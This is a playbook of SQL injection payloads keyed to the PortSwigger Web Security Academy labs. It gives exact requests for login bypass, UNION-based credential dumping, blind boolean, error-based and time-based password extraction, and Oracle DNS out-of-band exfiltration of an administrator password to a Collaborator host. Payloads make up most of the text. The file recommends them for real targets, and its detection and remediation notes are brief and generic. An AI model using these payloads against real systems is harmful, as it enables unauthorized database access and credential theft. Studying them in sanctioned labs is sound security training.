---
name: "SQL Injection — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python]
difficulty: "advanced"
---

# SQL Injection — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. Difficulty: 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- Studying for BSCP (Burp Suite Certified Practitioner) certification
- Testing real-world targets for these vulnerability classes
- Bug bounty hunting — these exact techniques find real bugs
- Building exploitation chains

## Prerequisites
- Burp Suite Professional (Community works for most)
- Browser with proxy configured
- Burp Collaborator or interactsh for OOB testing


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: WHERE clause hidden data 🟢 APPRENTICE

```http
GET /filter?category=Gifts'+OR+1=1-- HTTP/1.1
```
**Why it works:** The `--` comments out the rest of the WHERE clause (`AND released=1`), exposing unreleased products.
**Zero-day variant:** Try `category=Gifts'/**/OR/**/1=1--` for WAF bypass using SQL comments as whitespace.
---

### Lab 2: Login bypass 🟢 APPRENTICE

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=anything
```
**Why it works:** The `'--` after `administrator` comments out the password check in the SQL query.
**Zero-day:** Try `username=admin'/*&password=*/OR/**/1=1--` — multi-line comment wrapping.
---

### Lab 3: DB type/version on Oracle 🟡 PRACTITIONER

```http
GET /filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version-- HTTP/1.1
```
**Step 1:** Determine columns: `'+ORDER+BY+2--` (if 2 works but 3 errors = 2 columns)
**Step 2:** Oracle requires FROM: `'+UNION+SELECT+NULL,NULL+FROM+dual--`
**Step 3:** Extract: `'+UNION+SELECT+banner,NULL+FROM+v$version--`
---

### Lab 4: DB type/version on MySQL/Microsoft 🟡 PRACTITIONER

```http
GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL--+- HTTP/1.1
```
**MySQL note:** Comments need `-- -` (space+dash) or `#` (`%23` URL-encoded).
**Microsoft:** `'+UNION+SELECT+@@version,NULL--`
---

### Lab 5: Listing contents non-Oracle 🟡 PRACTITIONER

```http
# Step 1: Get table names
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

# Step 2: Get columns from users table
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

# Step 3: Extract credentials
'+UNION+SELECT+username_abcdef,password_abcdef+FROM+users_abcdef--
```
---

### Lab 6: Listing contents Oracle 🟡 PRACTITIONER

```http
# Step 1: Get tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

# Step 2: Get columns
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

# Step 3: Extract
'+UNION+SELECT+USERNAME_ABCDEF,PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```
---

### Lab 7: UNION determining columns 🟡 PRACTITIONER

```http
# Method 1: ORDER BY (increment until error)
'+ORDER+BY+1--    -> OK
'+ORDER+BY+2--    -> OK  
'+ORDER+BY+3--    -> OK
'+ORDER+BY+4--    -> ERROR  => 3 columns

# Method 2: UNION NULL (add NULLs until match)
'+UNION+SELECT+NULL--         -> ERROR
'+UNION+SELECT+NULL,NULL--    -> ERROR
'+UNION+SELECT+NULL,NULL,NULL-- -> OK => 3 columns
```
---

### Lab 8: UNION finding text column 🟡 PRACTITIONER

```http
# After knowing 3 columns, test each for string:
'+UNION+SELECT+'abc',NULL,NULL--   -> ERROR (column 1 is not string)
'+UNION+SELECT+NULL,'abc',NULL--   -> OK! (column 2 accepts text)
'+UNION+SELECT+NULL,NULL,'abc'--   -> (test column 3 too)

# Now inject the required string:
'+UNION+SELECT+NULL,'TARGET_STRING',NULL--
```
---

### Lab 9: UNION retrieving from other tables 🟡 PRACTITIONER

```http
'+UNION+SELECT+username,password+FROM+users--
```
Login with `administrator` credentials from the output.
---

### Lab 10: UNION multiple values single column 🟡 PRACTITIONER

```http
# Only 1 string column? Concatenate!
# Oracle:    username||'~'||password
# MySQL:     CONCAT(username,'~',password)
# Postgres:  username||'~'||password
# MSSQL:     username+'~'+password

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
Parse output: `administrator~s3cr3tpassw0rd`
---

### Lab 11: Blind conditional responses 🟡 PRACTITIONER

```http
# Confirm table exists:
Cookie: TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+LIMIT+1)='a

# Confirm administrator exists:
Cookie: TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a

# Extract password length:
Cookie: TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>19)='a

# Extract password char by char:
Cookie: TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a
# Automate with Burp Intruder: position=1-20, charset=a-z0-9
```
---

### Lab 12: Blind conditional errors 🟡 PRACTITIONER

```http
# Oracle error-based blind:
Cookie: TrackingId=xyz'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'

# If TRUE: error (divide by zero). If FALSE: no error.

# Extract password:
Cookie: TrackingId=xyz'||(SELECT+CASE+WHEN+(SUBSTR(password,1,1)='a')+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'
```
---

### Lab 13: Visible error-based SQLi 🟡 PRACTITIONER

```http
# Force error that leaks data:
Cookie: TrackingId=xyz'+AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--

# Error message will contain: "invalid input syntax for integer: 's3cr3tpassw0rd'"
# The password is leaked IN the error message itself!
```
---

### Lab 14: Blind time delays 🟡 PRACTITIONER

```http
# PostgreSQL: Cookie: TrackingId=xyz'||pg_sleep(10)--
# MySQL:      Cookie: TrackingId=xyz'+AND+SLEEP(10)--
# Oracle:     Cookie: TrackingId=xyz'||dbms_pipe.receive_message(('a'),10)--
# MSSQL:      Cookie: TrackingId=xyz';WAITFOR+DELAY+'0:0:10'--

# If response takes 10 seconds = vulnerable
```
---

### Lab 15: Blind time delays + data extraction 🟡 PRACTITIONER

```http
# PostgreSQL conditional time delay:
Cookie: TrackingId=xyz'%3BSELECT+CASE+WHEN+(SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--

# If response takes 5s = char is 'a'. Else instant response.
# Automate: Burp Intruder with Cluster Bomb, monitor response time.
```
---

### Lab 16: Blind out-of-band interaction 🟡 PRACTITIONER

```http
# Oracle XXE via SQLi (triggers DNS lookup):
Cookie: TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR.net/">%25remote%3B]>'),'/l')+FROM+dual--

# Check Burp Collaborator for DNS/HTTP interaction
```
---

### Lab 17: Blind OOB data exfiltration 🟡 PRACTITIONER

```http
# Oracle — exfiltrate password via DNS subdomain:
Cookie: TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username%3D'administrator')||'.BURP-COLLAB.net/">%25remote%3B]>'),'/l')+FROM+dual--

# DNS query received: s3cr3tpassw0rd.BURP-COLLAB.net
```
---

### Lab 18: Filter bypass via XML encoding 🔴 EXPERT

```http
POST /product/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>&#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
**Technique:** XML hex entities (`&#x53;` = `S`) bypass WAF keyword detection.
**Zero-day:** Combine with `&#x55;NION &#x53;ELECT` for full UNION in XML context.
**Extension:** Hackvertor Burp extension auto-encodes payloads.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research Methodology
When a standard technique doesn't work:
1. **Identify the filter**: What chars/patterns are blocked?
2. **Research bypasses**: Search GitHub, Twitter, PortSwigger Research for new techniques
3. **Fuzz extensively**: Use Burp Intruder with custom charset/tag lists
4. **Chain vulnerabilities**: Combine two medium findings into one critical
5. **Check encoding layers**: URL, HTML entity, Unicode, double-encode, XML entity


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PortSwigger All Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
